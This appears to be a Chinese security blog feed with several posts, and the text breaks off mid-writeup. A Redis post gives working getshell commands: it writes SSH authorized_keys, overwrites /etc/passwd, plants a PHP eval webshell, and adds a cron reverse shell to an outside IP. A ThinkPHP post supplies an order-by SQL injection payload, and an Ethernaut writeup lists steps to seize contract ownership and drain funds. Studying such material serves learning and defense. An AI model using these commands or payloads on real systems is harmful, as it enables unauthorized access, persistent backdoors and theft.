class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"调用了Foo 的fly函数, 飞了"</span>+len+<span class="string">"米"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"调用invoke函数，方法名为"</span>+method.getName()+<span class="string">", 参数为"</span>+args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 正常调用</span></span><br><span class="line">        Foo f = <span class="keyword">new</span> Foo();</span><br><span class="line">        f.go();</span><br><span class="line">        f.run();</span><br><span class="line">        f.fly(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态代理调用我们定义的go函数</span></span><br><span class="line">        IFoo f1 = (IFoo) Proxy.newProxyInstance(Foo.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IFoo.class&#125;, <span class="keyword">new</span> DynamicInvocationHandler());</span><br><span class="line">        f1.go();</span><br><span class="line"><span class="comment">//        ff.run();</span></span><br><span class="line">        f1.fly(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        IFoo f2 = (IFoo) Proxy.newProxyInstance(Foo.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;IFoo.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">"method name is "</span>+ method.getName() + <span class="string">", args is "</span>+args);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        f2.go();</span><br><span class="line">        f2.fly(<span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> ysoserial </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>redis未授权访问getshell方法</title>
      <link href="//blog/2018/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEgetshell%E6%96%B9%E6%B3%95.html"/>
      <url>//blog/2018/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEgetshell%E6%96%B9%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<hr><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>当我们通过未授权访问或弱密码成功访问redis服务器是，我们应该怎样进一步获取权限呢？</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">未授权连接</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">带密码连接</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379 -a password</span><br><span class="line"></span><br><span class="line">info   # 服务器命令</span><br><span class="line">keys * # 检索所有键（生产服务器慎用，ctf随意） </span><br><span class="line">get 某个key # 查看键对应的值</span><br><span class="line">del 某个key # 删除该键值对</span><br><span class="line">config get * # 查看config信息</span><br><span class="line">config set xxx yyy # 设置config信息</span><br><span class="line"></span><br><span class="line">善用&amp;慎用flushdb和flushall（只有ctf敢用）</span><br></pre></td></tr></table></figure><h3 id="redis数据库文件格式"><a href="#redis数据库文件格式" class="headerlink" title="redis数据库文件格式"></a>redis数据库文件格式</h3><blockquote><p>RDB文件是二进制文件，</p><p>详情可以参考<a href="https://github.com/sripathikrishnan/redis-rdb-tools/wiki/Redis-RDB-Dump-File-Format" target="_blank" rel="noopener">Redis-RDB-Dump-File-Format</a></p></blockquote><h3 id="redis写authorized-keys"><a href="#redis写authorized-keys" class="headerlink" title="redis写authorized_keys"></a>redis写authorized_keys</h3><p>首先，生成密钥对(如果有，可跳过)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后，为了方便，我们生成一个临时文件（工作目录在密钥所在目录）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e "\n\n\n"; cat id_rsa.pub; echo -e "\n\n\n") &gt; pub.txt</span><br></pre></td></tr></table></figure><p>接着，连接redis并存储数据到redis上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pub.txt| redis-cli -h 192.168.2.155 -p 6379 -a 1q2w3e4r -x set gaia</span><br></pre></td></tr></table></figure><p>再后来，设置目录，并保存文件（可以考虑尝试别的用户）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>最后，通过私钥连接登入服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.2.155</span><br></pre></td></tr></table></figure><h3 id="redis写-etc-passwd"><a href="#redis写-etc-passwd" class="headerlink" title="redis写/etc/passwd"></a>redis写/etc/passwd</h3><p>linux低版本时，用户密码的加密值是保存在/etc/passwd中的，现在流行的版本一般保存在/etc/shadow中。若/etc/passwd和/etc/shadow中同时存在密码，则会使用/etc/passwd中的密码进行验证。可以通过覆盖写入/etc/passwd来实现重置密码。</p><blockquote><p>生成密码加密值，可以使用mkpasswd(ubuntu中需要安装whois包)</p><p>mkpasswd –method=sha-512 –salt=’test0salt0’ ‘TestPasswd@qq.com’</p><p>$6$test0salt0$2Nio/OEu83E1G22Vh0g3prwWimlZF7x0GGPeyMu4HQK2tIBxNg7NvFeW2yH.UaLebb4NA4S8VDxWuP7HG5ZfJ0</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushdb</span><br><span class="line">config set dir /etc</span><br><span class="line">config set dbfilename passwd</span><br><span class="line">SET x "\n\n$6$test0salt0$2Nio/OEu83E1G22Vh0g3prwWimlZF7x0GGPeyMu4HQK2tIBxNg7NvFeW2yH.UaLebb4NA4S8VDxWuP7HG5ZfJ0\n\n"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushdb</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename "gaia.php"</span><br><span class="line">set gaia "&lt;?php eval($_POST[cmd]);?&gt;"</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>菜刀连接</p><h3 id="redis写定时任务反弹shell"><a href="#redis写定时任务反弹shell" class="headerlink" title="redis写定时任务反弹shell"></a>redis写定时任务反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushdb</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.2.155/2333 0&gt;&amp;1\n"</span><br><span class="line">save</span><br><span class="line">(有待测试，ubuntu测试不成功)</span><br></pre></td></tr></table></figure><h3 id="修改redis中数据，结合别的应用getshell"><a href="#修改redis中数据，结合别的应用getshell" class="headerlink" title="修改redis中数据，结合别的应用getshell"></a>修改redis中数据，结合别的应用getshell</h3><blockquote><p>比如：redis里面缓存的数据是传递给celery的，而且恰好是用的pickle格式数据。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ThinkPHP_3.X_5.X_order_by注入漏洞分析</title>
      <link href="//blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
      <url>//blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>ThinkPHP未对数组的key进行过滤，导致在构造SQL的order by部分时，将关联数组的key进行拼接，导致SQL注入。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote><p>ThinkPHP v3.x</p><p>ThinkPHP v5.x &lt; ThinkPHP v5.1.22</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="ThinkPHP-v5-1-22"><a href="#ThinkPHP-v5-1-22" class="headerlink" title="ThinkPHP v5.1.22"></a>ThinkPHP v5.1.22</h3><p>library/think/db/Builder.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * order分析</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Query     $query        查询对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed     $order</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">(Query $query, $order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'[rand]'</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">' '</span>, strpos($val, <span class="string">' '</span>) ? $val : $val . <span class="string">' '</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">' ORDER BY '</span> . implode(<span class="string">','</span>, $array);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字段名分析</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Query  $query    查询对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed  $key      字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool   $strict   严格检测</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">(Query $query, $key, $strict = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $key <span class="keyword">instanceof</span> Expression ? $key-&gt;getValue() : $key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果<code>$order</code>中的<code>$key</code>直接拼接到了SQL语句中。</p><p>若提交<code>order[&#39;username|updatexml(1,concat(0x7e,(version())),0)%23&#39;]</code></p><p>那么，拼接后的SQL语句就注入了我们的代码了。</p><p>貌似最近有不少因为$key未过滤引发的SQL注入漏洞，是一个很少人考虑到要过滤的点。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a></p><p><a href="https://www.seebug.org/vuldb/ssvid-97512" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97512</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> ThinkPHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ethernaut训练writeup</title>
      <link href="//blog/2018/Ethernaut%E8%AE%AD%E7%BB%83writeup.html"/>
      <url>//blog/2018/Ethernaut%E8%AE%AD%E7%BB%83writeup.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>ethernaut包含有15道智能合约的训练题目，我们充分了解下。(写的不会很详细，不过思路还是清晰的，有兴趣的同学自己动手试试吧)</p><p><a href="https://ethernaut.zeppelin.solutions/level/0x6545df87f57d21cb096a0bfcc53a70464d062512" target="_blank" rel="noopener">地址</a></p><h3 id="level-0-Hello-Ethernaut"><a href="#level-0-Hello-Ethernaut" class="headerlink" title="level 0 Hello Ethernaut"></a>level 0 Hello Ethernaut</h3><p>试玩关，没什么挑战的。会看英文就行。</p><h3 id="level-1-Fallback"><a href="#level-1-Fallback" class="headerlink" title="level 1 Fallback"></a>level 1 Fallback</h3><blockquote><p>Look carefully at the contract’s code below.<br>You will beat this level if<br>you claim ownership of the contract<br>you reduce its balance to 0<br>  Things that might help<br>How to send ether when interacting with an ABI<br>How to send ether outside of the ABI<br>Converting to and from wei/ether units -see help() command-<br>Fallback methods</p></blockquote><p>合约代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fallback</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析合约，发现只要先调用<code>contribute</code>函数，然后转一点点钱，然后再调用<code>fallback</code>函数即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 充钱</span><br><span class="line">contract.contribute(&#123;value:1&#125;)</span><br><span class="line">此时，我们成功冲入了1 wei</span><br><span class="line">2. 调用fallcak函数</span><br><span class="line">我们使用contract.address查看到合约的地址，</span><br><span class="line">通过向该地址发送一点点ether，即可调用fallback函数，成功成为owner</span><br><span class="line">这里不知道为什么用那个插件发送ether会failed</span><br><span class="line">不过，没关系，我们可以通过调用不存在的函数或者用console的send来转钱调用</span><br><span class="line">contract.send(1)</span><br><span class="line">contract.owner()查看当前拥有者，果然我们已经成了owner</span><br><span class="line">3. 调用withdraw转走钱</span><br><span class="line">调用contract.withdraw()把钱转走</span><br></pre></td></tr></table></figure><blockquote><p>You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.</p><p>You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.</p><p>Move on to the next level when you’re ready!</p></blockquote><h3 id="level-2-Fallout"><a href="#level-2-Fallout" class="headerlink" title="level 2 Fallout"></a>level 2 Fallout</h3><blockquote><p>Claim ownership of the contract below to complete this level.<br>  Things that might help<br>Solidity Remix IDE</p></blockquote><figure class="highlight java"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.18;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function">function <span class="title">Fal1out</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">allocate</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">sendAllocation</span><span class="params">(address allocator)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">collectAllocations</span><span class="params">()</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">    msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">allocatorBalance</span><span class="params">(address allocator)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍微看看，这题目，Fallout里面的Fal1out函数(名字不同，并不是构造函数呢)，直接可以调用的。</p><p>所以，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 调用Fal1out函数，成为owner</span><br><span class="line">contract.Fal1out()</span><br><span class="line">此时，我们是owner了，通过调用</span><br><span class="line">contract.owner()可以看到</span><br><span class="line">2. 调用collectAllocations函数可以转走所有钱</span><br><span class="line">contract.collectAllocations()</span><br></pre></td></tr></table></figure><blockquote><p>That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?</p><p>Well… Not quite.</p><p>The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract Rubixi &#123;</span><br><span class="line">&gt;   address private owner;</span><br><span class="line">&gt;   function DynamicPyramid() &#123; owner = msg.sender; &#125;</span><br><span class="line">&gt;   function collectAllFees() &#123; owner.transfer(this.balance) &#125;</span><br><span class="line">&gt;   ...</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smart-contract-land.</p></blockquote><h3 id="level-3-Coin-Flip"><a href="#level-3-Coin-Flip" class="headerlink" title="level 3 Coin Flip"></a>level 3 Coin Flip</h3><blockquote><p>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you’ll need to use your psychic abilities to guess the correct outcome 10 times in a row. </p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">CoinFlip</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 